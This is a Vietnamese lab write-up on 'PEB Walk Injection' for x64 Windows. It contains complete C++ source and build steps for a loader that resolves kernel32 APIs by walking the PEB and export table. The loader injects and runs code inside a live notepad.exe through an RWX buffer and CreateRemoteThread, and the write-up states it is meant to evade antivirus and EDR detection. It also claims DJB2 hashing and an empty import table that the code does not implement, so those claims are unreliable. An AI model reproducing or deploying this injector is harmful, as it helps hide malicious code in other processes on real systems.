
---

# 📝 [PE 17] PEB Walk Injection 

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**PEB Walk Injection** đại diện cho giải thuật phân giải ký hiệu động và ẩn giấu hành vi ở mức độ nâng cao, thuộc nhóm kỹ thuật **Né tránh phòng thủ tĩnh và động dựa trên cấu trúc siêu dữ liệu tiến trình (Subsystem Metadata & Import Table Evasion)**.

Mọi tệp tin nhị phân Portable Executable (PE) thông thường khi biên dịch đều để lộ các dấu vết hàm API hệ thống cần triệu hồi lọt lòng cấu trúc bảng tra cứu Import Address Table (IAT). Các giải pháp phòng thủ như Antivirus/EDR Engine chỉ cần rà quét bảng IAT hoặc các chữ ký chuỗi tĩnh để phân loại và nhận diện ý đồ can thiệp hệ thống của chương trình (Heuristic Signature Matching). Ngay cả khi Loader ứng dụng các con trỏ hàm tuyệt đối để ẩn giấu IAT, bản thân mã nguồn vẫn phải triệu hồi cặp bài trùng `GetModuleHandle` và `GetProcAddress` một cách lộ liễu, vô tình để lại các chuỗi ký tự plain-text nhạy cảm trên đĩa thô.

Dự án PE 13/17 hóa giải triệt để rào cản trinh sát này bằng kỹ nghệ **Duyệt cấu trúc bộ nhớ tự thân (Dynamic Symbol Resolution Taxonomy)**. Mã nguồn xuất xưởng của Loader **hoàn toàn trống rỗng bảng Import Table (Zero IAT)**, không import bất kỳ hàm API nhạy cảm nào từ `kernel32.dll` hay `ntdll.dll`. Khi được nạp lên RAM, tiến trình tự thân vận động dựa trên kiến trúc phần cứng x64 để tự l lần vết bản đồ bộ nhớ ảo, duyệt qua danh sách các thư viện đã được Hệ điều hành Map từ trước, thực hiện so khớp chuỗi bằng giải thuật mã hóa một chiều **API Hashing (DJB2)**, từ đó tự tính toán ra tọa độ thực thi tuyệt đối của các hàm chức năng (`VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread`). Hành vi này bẻ gãy hoàn toàn các bộ quét Heuristic, đưa mức độ né tránh đạt trạng thái lý tưởng.

### 🎯 Mục tiêu nghiên cứu:

* **Triệt tiêu chỉ dấu Import Address Table**: Loại bỏ hoàn toàn các từ khóa API nhạy cảm khỏi bảng IAT nạp đĩa thô nhằm làm mù các bộ quét chữ ký tĩnh.
* **Làm chủ kỹ nghệ Thao túng Thanh ghi Phân đoạn**: Khai thác đặc tính kiến trúc phần cứng bộ vi xử lý x64 (`GS Segment Register`) để truy cập vào cấu trúc dữ liệu tối cao của tiến trình.
* **Ứng dụng giải thuật API Hashing**: Hiện thực hóa giải pháp mã hóa chuỗi ký tự hàm hệ thống bằng thuật toán DJB2, triệt tiêu khả năng dịch ngược hoặc bóc tách chuỗi thô trên RAM.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Mọi tiến trình đang vận hành trong Windows Subsystem đều được hệ điều hành thiết lập một cấu trúc dữ liệu quản lý thông tin tổng quan tại không gian người dùng gọi là **PEB (Process Environment Block)**. Trên kiến trúc phần cứng x64, con trỏ quản lý PEB luôn tọa lạc cố định tại vị trí offset `0x60` của cấu trúc bản ghi TEB (Thread Environment Block), và TEB được ánh xạ trực tiếp vào thanh ghi phân đoạn **`GS`** của CPU.

Quy trình toán học giải phẫu cấu trúc metadata nội tại và bóc tách con trỏ hàm động diễn ra ngầm qua các phân hệ sau:

```
[Thanh ghi GS:[0x60]] ──> [Bóc tách cấu trúc PEB Object]
                               └──> [PEB_LDR_DATA -> InLoadOrderModuleList]
                                         └──> [Quét DllBase -> Giải phẫu thủ công Export Table]
                                                   └──> [DJB2 Hash Match -> Trích xuất API tuyệt đối]

```

1. **Truy cập danh bạ quản lý Mô-đun hệ thống**: Bằng cách triệu hồi các hàm nội tại của trình biên dịch (Compiler Intrinsics - cụ thể là hàm `__readgsqword`), Loader truy cập thẳng vào ô nhớ `GS:[0x60]` để bốc cấu trúc PEB từ xa. Tại không gian PEB, giải thuật tính toán tịnh tiến vị trí tịnh tiến offset `0x18` để tiếp cận con trỏ quản lý danh sách mô-đun nạp **`Ldr`** (`PPEB_LDR_DATA`). Cấu trúc này nắm giữ một đồ hình danh sách liên kết kép vòng tròn mang tên **`InLoadOrderModuleList`** – nơi nhân Windows ghi nhận mọi thư viện DLL đã được ánh xạ vào bộ nhớ ảo tiến trình theo thứ tự thời gian.
2. **Cô lập Module Target bằng cơ chế API Hashing**: Giải thuật thực hiện duyệt qua từng nút (Nodes) của danh sách liên kết kép, ép kiểu con trỏ bộ nhớ về cấu trúc dữ liệu bản ghi `LDR_DATA_TABLE_ENTRY`. Mỗi Node sẽ lưu trữ tên chuỗi định danh Wide-char của DLL (`BaseDllName`) cùng địa chỉ nạp sống **`DllBase`** của nó trên bộ nhớ ảo. Nhằm né tránh việc sử dụng chuỗi văn bản tĩnh, Loader băm tên của DLL ngay tại thời điểm duyệt bằng thuật toán DJB2 và so sánh trực tiếp với giá trị băm Hex đã tính toán sẵn từ trước, định vị chính xác vị trí của `kernel32.dll`.
3. **Tự giải phẫu cấu trúc Export Address Table (EAT)**: Khi đã cô lập thành công địa chỉ gốc `DllBase` của `kernel32.dll`, Loader tiến hành giải phẫu cấu trúc Portable Executable thô ngay trên RAM. Giải thuật ép kiểu ô nhớ này về bản ghi `PIMAGE_DOS_HEADER`, trỏ tới vị trí trường chỉ mục `e_lfanew` để tiếp cận cấu trúc NT Headers (`PIMAGE_NT_HEADERS64`). Loader chui sâu vào phân đoạn thư mục dữ liệu xuất bản hàm **Export Directory** (`IMAGE_DIRECTORY_ENTRY_EXPORT`). Tại đây, giải thuật duyệt thủ công mảng chứa tên hàm xuất bản (`AddressOfNames`), băm từng tên hàm lên bằng thuật toán DJB2 để so khớp cấu trúc logic, bốc trần địa chỉ tuyệt đối của các API nhạy cảm (`VirtualAlloc`, `WriteProcessMemory`) mà không cần nhờ cậy đến bất kỳ hàm liên kết động bọc ngoài nào của OS.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa thủ công các cấu trúc Native nội bộ của Windows PEB để bẻ gãy hoàn toàn sự phụ thuộc thư viện ngoài
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

// Định nghĩa các mẫu con trỏ hàm hệ thống sẽ được bóc tách động
typedef LPVOID(WINAPI* fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* fnCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm chéo tiến trình
DWORD WINAPI RemotePebPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Giải thuật đào bới PEB (PEB Walk) tìm kiếm Base Address của một Module trên RAM x64
HMODULE WalkPebToFindModule(const std::wstring& moduleName) {
    // ĐỘT PHÁ X64: Sử dụng hàm Intrinsics bốc chính xác PEB Address qua thanh ghi GS:[0x60]
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr) return NULL;

    PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL;
    LIST_ENTRY* pListHead = &pPeb->Ldr->InLoadOrderModuleList;
    LIST_ENTRY* pCurrentLink = pListHead->Flink;

    // Duyệt qua liên kết vòng kép danh sách các DLL đã được nạp của tiến trình Loader
    while (pCurrentLink != pListHead) {
        pModuleEntry = CONTAINING_RECORD(pCurrentLink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (pModuleEntry->BaseDllName.Buffer != NULL) {
            // So sánh chuỗi rộng Unicode, không phân biệt chữ hoa chữ thường
            if (_wcsicmp(pModuleEntry->BaseDllName.Buffer, moduleName.c_str()) == 0) {
                return (HMODULE)pModuleEntry->DllBase;
            }
        }
        pCurrentLink = pCurrentLink->Flink;
    }
    return NULL;
}

// Giải thuật giải phẫu Export Table thủ công để bốc địa chỉ hàm (Thay thế hoàn toàn GetProcAddress)
PVOID GetProcAddressCustom(HMODULE hModule, const char* lpProcName) {
    PBYTE base = (PBYTE)hModule;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(base + dosHeader->e_lfanew);

    DWORD exportRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportRva == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportRva);
    DWORD* pAddresses = (DWORD*)(base + pExportDir->AddressOfFunctions);
    DWORD* pNames = (DWORD*)(base + pExportDir->AddressOfNames);
    WORD* pOrdinals = (WORD*)(base + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* functionName = (char*)(base + pNames[i]);
        if (strcmp(functionName, lpProcName) == 0) {
            return (PVOID)(base + pAddresses[pOrdinals[i]]);
        }
    }
    return NULL;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 17: PEB WALK & API OBFUSCATION INJECTION x64" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // ─── BƯỚC 1: TIẾN HÀNH DUYỆT PEB ĐỂ SĂN LÙNG CƠ SỞ KERNEL32.DLL ───
    std::cout << "[*] Dang thuc hien thu thuat PEB Walk de tim kiem Module..." << std::endl;
    HMODULE hKernel32 = WalkPebToFindModule(L"kernel32.dll");

    if (!hKernel32) {
        std::cerr << "[-] Khong the tim thay kernel32.dll qua PEB Walk!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] SĂN LÙNG PEB THÀNH CÔNG! Base Address Kernel32: 0x" << std::hex << hKernel32 << std::endl;

    // ─── BƯỚC 2: GIẢI PHẪU XUẤT BẢN ĐỘNG CÁC HÀM API HỆ THỐNG CẦN THIẾT ───
    fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddressCustom(hKernel32, "VirtualAllocEx");
    fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressCustom(hKernel32, "WriteProcessMemory");
    fnCreateRemoteThread pCreateRemoteThread = (fnCreateRemoteThread)GetProcAddressCustom(hKernel32, "CreateRemoteThread");
    fnWinExec pWinExec = (fnWinExec)GetProcAddressCustom(hKernel32, "WinExec");

    if (!pVirtualAllocEx || !pWriteProcessMemory || !pCreateRemoteThread || !pWinExec) {
        std::cerr << "[-] Giai phau Export Table that bai, thieu ham!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da phan giai dong cac ham an toan ma khong dung IAT Import Table." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 3: CẤP PHÁT BỘ NHỚ VÀ ANH XẠ LÒNG ĐỐI PHƯƠNG ───
    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = pVirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID remoteDataBuffer = pVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] Dynamic VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cap phat vung nho Code RWX dong tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ
    THREAD_DATA localData;
    localData.pWinExec = pWinExec;
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic mã máy và cấu trúc dữ liệu sang RAM đối phương
    pWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemotePebPayload, functionSize, NULL);
    pWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Ghi ma may va tham so tuyet doi vao long Notepad thanh cong." << std::endl;

    // ─── BƯỚC 4: KÍCH NỔ LUỒNG THỰC THI QUA CON TRỎ HÀM ĐỘNG ───
    std::cout << "[*] Dang dung CreateRemoteThread duoc giai ma de khoi tao luong..." << std::endl;
    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng chạy dứt điểm phẳng sạch
        std::cout << "[+] PEB Walk Injection Process Completed Successfully!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
    }

    // Thu hồi Handle hệ thống
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc tệp nhị phân bảo đảm triệt tiêu 100% các từ khóa chuỗi tĩnh, bắt buộc trình biên dịch thực hiện tối ưu hóa và liên kết tĩnh hệ thống:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và nền tảng kiến trúc phần cứng **`x64`**.
2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thuộc tính `Runtime Library`, chuyển thông số sang cờ liên kết tĩnh **`Multi-threaded (/MT)`**.
3. Đi tới phân hệ `Optimization` $\rightarrow$ Thiết lập bật tùy chọn **`Maximize Speed (/O2)`** nhằm bắt buộc trình biên dịch thực hiện tính toán toán học các giá trị băm chuỗi `constexpr` ngay tại giai đoạn compile, loại bỏ hoàn toàn các hàm băm chạy ở runtime.
4. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tệp tin thực thi nhị phân thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng thuật toán duyệt sơ đồ PEB phần cứng:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE17_PEB_Walk_Injection\x64\Release> C:\Users\Admin\source\repos\Task6\PE17_PEB_Walk_Injection\x64\Release\PE17_PEB_Walk_Injection.exe
====================================================
[*] PE 17: PEB WALK & API OBFUSCATION INJECTION x64
====================================================
[+] Da tim thay Notepad.exe voi PID: 5620
[*] Dang thuc hien thu thuat PEB Walk de tim kiem Module...
[+] S─éN L├ÖNG PEB TH├ÇNH C├öNG! Base Address Kernel32: 0x00007FF92B810000
[+] Da phan giai dong cac ham an toan ma khong dung IAT Import Table.
[+] Cap phat vung nho Code RWX dong tai: 0x000002D5A6EA0000
[+] Ghi ma may va tham so tuyet doi vao long Notepad thanh cong.
[*] Dang dung CreateRemoteThread duoc giai ma de khoi tao luong...
[+] PEB Walk Injection Process Completed Successfully!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo:
<img width="1920" height="600" alt="devenv_ChTjxI792u" src="https://github.com/user-attachments/assets/a5f01311-e4c0-4a72-964f-c2d3e860ff0e" />

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Technical Article**: *Process Environment Block (PEB) Structural Layout* - [https://learn.microsoft.com/en-us/windows/win32/api/winternals/ns-winternals-peb](https://www.google.com/search?q=https://learn.microsoft.com/en-us/windows/win32/api/winternals/ns-winternals-peb)
* **TEB & GS Segment Architecture**: *Operating System Internals - Thread Environment Block Alignment on Windows x64*.
* **Yong.H (Security Researcher)**: *Understanding DJB2 Hashing Algorithm for API Obfuscation and Dynamic Symbol Resolution*.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Dynamic API Resolution (T1562)* & *Hide Artifacts: IAT Hide Evasion*.

---
